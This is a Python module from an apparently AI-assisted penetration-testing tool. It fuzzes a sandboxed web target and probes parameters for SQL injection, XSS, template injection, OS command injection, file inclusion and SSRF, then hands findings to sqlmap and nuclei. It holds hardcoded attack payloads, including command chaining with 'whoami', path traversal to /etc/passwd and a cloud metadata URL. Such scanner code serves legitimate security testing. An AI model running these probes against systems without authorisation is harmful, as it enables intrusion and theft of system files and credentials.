"""
agents/web_api_agent.py
-----------------------
Agent 1: Web/API Surface Attacker.

Performs real multi-vector probing against live endpoints with proper
vulnerability detection logic:
- Error-based detection (HTTP 500 + error keywords)
- Reflection-based detection (payload appears in response)
- Time-based & Output-based detection (OS command injection & SSTI evaluation)
- Uses actual pentesting tools (sqlmap, nuclei, ffuf) when available
"""

from __future__ import annotations

import asyncio
import time
import os
from typing import Any, Dict, List
from agents.base_agent import BaseAgent
from reports.models import AgentFinding
from tools.dir_fuzzer import DirFuzzer
from tools.http_prober import HttpProber


class WebApiAgent(BaseAgent):
    """
    Attacks the HTTP web and API surface of the sandboxed target application.
    """

    async def run(self) -> List[AgentFinding]:
        self.current_action = "Discovering endpoints..."
        prober = HttpProber(self.sandbox.base_url)
        fuzzer = DirFuzzer(self.sandbox.base_url)

        # 1. Endpoint Discovery
        endpoints = set(self.profile.detected_routes or ["/"])
        fuzzed_results = await fuzzer.fuzz()
        for path, status in fuzzed_results:
            endpoints.add(path)

        # 2. Discover parameter names per endpoint by probing with benign input
        endpoint_params = await self._discover_params(prober, list(endpoints))

        # 3. Attack each endpoint with each vuln class
        for endpoint in list(endpoints)[:15]:
            params_for_ep = endpoint_params.get(
                endpoint,
                ["name", "username", "host", "q", "id", "input", "url", "file", "cmd", "query", "search"]
            )

            await self._test_sqli(prober, endpoint, params_for_ep)
            await self._test_xss(prober, endpoint, params_for_ep)
            await self._test_ssti(prober, endpoint, params_for_ep)
            await self._test_cmdinj(prober, endpoint, params_for_ep)
            await self._test_lfi(prober, endpoint, params_for_ep)
            await self._test_ssrf(prober, endpoint, params_for_ep)

        # 4. Use external tools if available
        await self._run_external_tools()

        self.current_action = "Web/API attack phase complete."
        return self.findings

    async def _discover_params(self, prober: HttpProber, endpoints: List[str]) -> Dict[str, List[str]]:
        """Send benign requests to discover which parameter names the endpoint accepts."""
        result = {}
        common_params = ["name", "username", "host", "q", "id", "input", "url", "file", "cmd", "query", "search"]
        for ep in endpoints[:10]:
            working = []
            baseline = await prober.probe(ep, method="GET")
            baseline_status = baseline["status_code"]
            for param in common_params:
                res = await prober.probe(ep, method="GET", params={param: "test123"})
                # If the status changes from baseline, or test123 is reflected, or status is 200/500
                if res["status_code"] != 0 and (res["status_code"] != baseline_status or "test123" in res["body"] or res["status_code"] == 200):
                    working.append(param)
            result[ep] = working if working else common_params
        return result

    async def _test_sqli(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for SQL injection using error-based and boolean-based detection."""
        self.current_action = f"Testing {endpoint} for SQL injection..."
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' ORDER BY 1--",
            "' UNION SELECT NULL--",
            "1; SELECT 1--",
        ]
        error_sigs = ["sql", "sqlite", "syntax error", "mysql", "postgresql", "operationalerror",
                      "programming error", "unterminated", "unrecognized token", "near \""]

        for param in params[:6]:
            baseline = await prober.probe(endpoint, method="GET", params={param: "normalvalue"})

            for payload in payloads:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                body_lower = res["body"].lower()
                status = res["status_code"]

                confirmed = False
                evidence = ""

                if status == 500:
                    for sig in error_sigs:
                        if sig in body_lower:
                            confirmed = True
                            evidence = f"HTTP 500 with SQL error signature '{sig}' in response:\n{res['body'][:500]}"
                            break
                    if not confirmed:
                        evidence = f"HTTP 500 triggered by SQLi payload on {endpoint}?{param}={payload}\n{res['body'][:300]}"
                        confirmed = True

                if not confirmed and status == 200 and baseline["status_code"] == 200:
                    if len(res["body"]) != len(baseline["body"]) and abs(len(res["body"]) - len(baseline["body"])) > 50:
                        for sig in error_sigs:
                            if sig in body_lower:
                                confirmed = True
                                evidence = f"Response body changed significantly with SQLi payload and contains '{sig}':\n{res['body'][:400]}"
                                break

                if confirmed:
                    analysis = await self.ask_llm(
                        "You are a senior penetration tester specializing in SQL injection. Analyze this finding and explain the vulnerability, its impact, and how an attacker would exploit it.",
                        f"Endpoint: {endpoint}\nParameter: {param}\nPayload: {payload}\nHTTP Status: {status}\nEvidence:\n{evidence}"
                    )
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="SQL Injection",
                        severity="High",
                        target_url=f"{self.sandbox.base_url}{endpoint}",
                        method="GET",
                        parameter=param,
                        payload_sent=payload,
                        evidence=evidence,
                        confirmed=True,
                        ai_analysis=analysis or f"Confirmed SQL injection on {endpoint} via parameter '{param}'. The application constructs SQL queries using unsanitized user input.",
                        curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                        remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                        chain_opportunity=f"SQLi on {endpoint} can be chained with auth bypass to extract credentials"
                    )
                    self.publish_finding(finding)
                    break

    async def _test_xss(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for reflected XSS by checking if payload is reflected in response."""
        self.current_action = f"Testing {endpoint} for XSS..."
        payloads = [
            "<script>alert('RAVEN')</script>",
            "'\"><img src=x onerror=alert('RAVEN')>",
            "<svg/onload=alert('RAVEN')>",
        ]
        for param in params[:6]:
            for payload in payloads:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                if payload.lower() in res["body"].lower():
                    analysis = await self.ask_llm(
                        "You are a penetration tester. Analyze this reflected XSS finding.",
                        f"Endpoint: {endpoint}\nParameter: {param}\nPayload: {payload}\nThe payload was reflected verbatim in the response body."
                    )
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="Reflected XSS",
                        severity="Medium",
                        target_url=f"{self.sandbox.base_url}{endpoint}",
                        method="GET",
                        parameter=param,
                        payload_sent=payload,
                        evidence=f"Payload reflected in response at {endpoint}:\n{res['body'][:400]}",
                        confirmed=True,
                        ai_analysis=analysis or f"Reflected XSS confirmed: user input rendered without sanitization.",
                        curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                        remediation="Escape all user input before rendering in HTML. Use framework auto-escaping.",
                        chain_opportunity=f"XSS on {endpoint} can steal session cookies for auth bypass"
                    )
                    self.publish_finding(finding)
                    break

    async def _test_ssti(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for Server-Side Template Injection."""
        self.current_action = f"Testing {endpoint} for SSTI..."
        test_cases = [
            ("{{7*7}}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("${7*7}", "49"),
            ("<h1>Hello {{7*7}}</h1>", "49"),
        ]
        for param in params[:6]:
            for payload, expected in test_cases:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                if expected in res["body"] and payload not in res["body"]:
                    analysis = await self.ask_llm(
                        "You are a penetration tester. Analyze this SSTI finding.",
                        f"Endpoint: {endpoint}\nParameter: {param}\nPayload: {payload}\nExpected: {expected}\nThe template expression was evaluated server-side, confirming SSTI.\nResponse:\n{res['body'][:400]}"
                    )
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="Server-Side Template Injection",
                        severity="Critical",
                        target_url=f"{self.sandbox.base_url}{endpoint}",
                        method="GET",
                        parameter=param,
                        payload_sent=payload,
                        evidence=f"Template expression '{payload}' evaluated to '{expected}' in response:\n{res['body'][:400]}",
                        confirmed=True,
                        ai_analysis=analysis or f"SSTI confirmed: Jinja2 template expressions are evaluated server-side. Can escalate to RCE.",
                        curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                        remediation="Never pass user input to render_template_string(). Use render_template() with separate template files.",
                        chain_opportunity=f"SSTI on {endpoint} allows Remote Code Execution via Jinja2 sandbox escape"
                    )
                    self.publish_finding(finding)
                    break

    async def _test_cmdinj(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for OS command injection using both output reflection and timing heuristics."""
        self.current_action = f"Testing {endpoint} for command injection..."
        
        # OS-agnostic command output detection payloads
        output_payloads = [
            ("127.0.0.1 & echo RAVEN_CMD_INJ", "RAVEN_CMD_INJ"),
            ("127.0.0.1 | echo RAVEN_CMD_INJ", "RAVEN_CMD_INJ"),
            ("127.0.0.1; echo RAVEN_CMD_INJ", "RAVEN_CMD_INJ"),
            ("127.0.0.1 && echo RAVEN_CMD_INJ", "RAVEN_CMD_INJ"),
            ("127.0.0.1\necho RAVEN_CMD_INJ", "RAVEN_CMD_INJ"),
            ("127.0.0.1 & whoami", "\\"),
            ("127.0.0.1; whoami", "root"),
        ]

        for param in params[:6]:
            # 1. Output-based verification (Primary)
            for payload, marker in output_payloads:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                if marker in res["body"] and res["status_code"] in (200, 500):
                    analysis = await self.ask_llm(
                        "You are a penetration tester. Analyze this OS command injection finding.",
                        f"Endpoint: {endpoint}\nParameter: {param}\nPayload: {payload}\nMarker found: {marker}\nResponse snippet:\n{res['body'][:400]}"
                    )
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="OS Command Injection",
                        severity="Critical",
                        target_url=f"{self.sandbox.base_url}{endpoint}",
                        method="GET",
                        parameter=param,
                        payload_sent=payload,
                        evidence=f"Injected command output '{marker}' reflected in HTTP response body:\n{res['body'][:400]}",
                        confirmed=True,
                        ai_analysis=analysis or "Command injection confirmed: arbitrary shell commands execute and output is returned in HTTP response.",
                        curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                        remediation="Never pass user input to subprocess with shell=True. Use subprocess.run() with argument lists.",
                        chain_opportunity=f"CmdInj on {endpoint} enables full server compromise"
                    )
                    self.publish_finding(finding)
                    break

            # 2. Time-based verification (Fallback)
            baseline = await prober.probe(endpoint, method="GET", params={param: "127.0.0.1"})
            baseline_time = baseline["elapsed_ms"]
            time_payloads = [
                "127.0.0.1 & ping -n 3 127.0.0.1",
                "127.0.0.1; sleep 3",
                "127.0.0.1 | sleep 3",
            ]
            for payload in time_payloads:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                if res["elapsed_ms"] > baseline_time + 2000 and res["status_code"] != 0:
                    analysis = await self.ask_llm(
                        "You are a penetration tester. Analyze this OS command injection finding.",
                        f"Endpoint: {endpoint}\nParameter: {param}\nPayload: {payload}\nBaseline response time: {baseline_time}ms\nPayload response time: {res['elapsed_ms']}ms\nThe significant time difference confirms command execution."
                    )
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="OS Command Injection",
                        severity="Critical",
                        target_url=f"{self.sandbox.base_url}{endpoint}",
                        method="GET",
                        parameter=param,
                        payload_sent=payload,
                        evidence=f"Time-based detection: baseline {baseline_time:.0f}ms vs payload {res['elapsed_ms']:.0f}ms (delta > 2s confirms execution)",
                        confirmed=True,
                        ai_analysis=analysis or f"Command injection confirmed via time-based detection. Shell commands are being executed server-side.",
                        curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                        remediation="Never pass user input to subprocess with shell=True. Use subprocess.run() with a list of arguments.",
                        chain_opportunity=f"CmdInj on {endpoint} allows arbitrary command execution on the server"
                    )
                    self.publish_finding(finding)
                    break

    async def _test_lfi(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for Local File Inclusion."""
        self.current_action = f"Testing {endpoint} for LFI..."
        payloads_and_sigs = [
            ("../../../../etc/passwd", ["root:", "bin:", "daemon:"]),
            ("..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
        ]
        for param in params[:6]:
            for payload, sigs in payloads_and_sigs:
                res = await prober.probe(endpoint, method="GET", params={param: payload})
                for sig in sigs:
                    if sig.lower() in res["body"].lower():
                        finding = AgentFinding(
                            agent="web_api",
                            vulnerability_type="Local File Inclusion",
                            severity="High",
                            target_url=f"{self.sandbox.base_url}{endpoint}",
                            method="GET",
                            parameter=param,
                            payload_sent=payload,
                            evidence=f"File content signature '{sig}' found in response:\n{res['body'][:400]}",
                            confirmed=True,
                            ai_analysis="LFI confirmed: arbitrary files from the server filesystem can be read.",
                            curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                            remediation="Validate and sanitize file paths. Use allowlists for permitted files.",
                            chain_opportunity=f"LFI on {endpoint} can leak config files, secrets, and source code"
                        )
                        self.publish_finding(finding)
                        break

    async def _test_ssrf(self, prober: HttpProber, endpoint: str, params: List[str]) -> None:
        """Test for Server-Side Request Forgery."""
        self.current_action = f"Testing {endpoint} for SSRF..."
        for param in params[:6]:
            payload = "http://169.254.169.254/latest/meta-data/"
            res = await prober.probe(endpoint, method="GET", params={param: payload})
            if any(sig in res["body"].lower() for sig in ["ami-id", "instance-id", "meta-data", "iam"]):
                finding = AgentFinding(
                    agent="web_api",
                    vulnerability_type="Server-Side Request Forgery",
                    severity="High",
                    target_url=f"{self.sandbox.base_url}{endpoint}",
                    method="GET",
                    parameter=param,
                    payload_sent=payload,
                    evidence=f"Cloud metadata endpoint content reflected:\n{res['body'][:400]}",
                    confirmed=True,
                    ai_analysis="SSRF confirmed: the server makes outbound HTTP requests to user-supplied URLs.",
                    curl_poc=f"curl '{self.sandbox.base_url}{endpoint}?{param}={payload}'",
                    remediation="Validate and restrict URLs that the server can fetch. Block internal IP ranges.",
                    chain_opportunity=f"SSRF on {endpoint} can access cloud metadata and internal services"
                )
                self.publish_finding(finding)
                break

    async def _run_external_tools(self) -> None:
        """Invoke external pentesting tools if available on PATH."""
        self.current_action = "Running external pentesting tools..."

        # sqlmap
        try:
            from tools.external.sqlmap_runner import SqlmapRunner
            sqlmap = SqlmapRunner()
            if sqlmap.is_available():
                for ep in list(self.profile.detected_routes or [])[:3]:
                    url = f"{self.sandbox.base_url}{ep}?id=1"
                    result = sqlmap.run(url)
                    if result.get("vulnerable"):
                        finding = AgentFinding(
                            agent="web_api",
                            vulnerability_type="SQL Injection (sqlmap)",
                            severity="Critical",
                            target_url=url,
                            method="GET",
                            parameter="id",
                            payload_sent="sqlmap --batch",
                            evidence=result.get("output", "")[:500],
                            confirmed=True,
                            ai_analysis="sqlmap confirmed SQL injection vulnerability with automated exploitation.",
                            curl_poc=f"sqlmap -u '{url}' --batch",
                            remediation="Use parameterized queries.",
                            chain_opportunity="sqlmap-confirmed SQLi enables full database extraction"
                        )
                        self.publish_finding(finding)
        except Exception:
            pass

        # nuclei
        try:
            from tools.external.nuclei_runner import NucleiRunner
            nuclei = NucleiRunner()
            if nuclei.is_available():
                result = nuclei.run(self.sandbox.base_url)
                for line in result.get("findings", []):
                    finding = AgentFinding(
                        agent="web_api",
                        vulnerability_type="Nuclei Finding",
                        severity="Medium",
                        target_url=self.sandbox.base_url,
                        method="SCAN",
                        parameter="",
                        payload_sent="nuclei -u target",
                        evidence=line,
                        confirmed=True,
                        ai_analysis=f"Nuclei template match: {line}",
                        curl_poc="",
                        remediation="Address the specific vulnerability identified by the nuclei template.",
                        chain_opportunity=None
                    )
                    self.publish_finding(finding)
        except Exception:
            pass
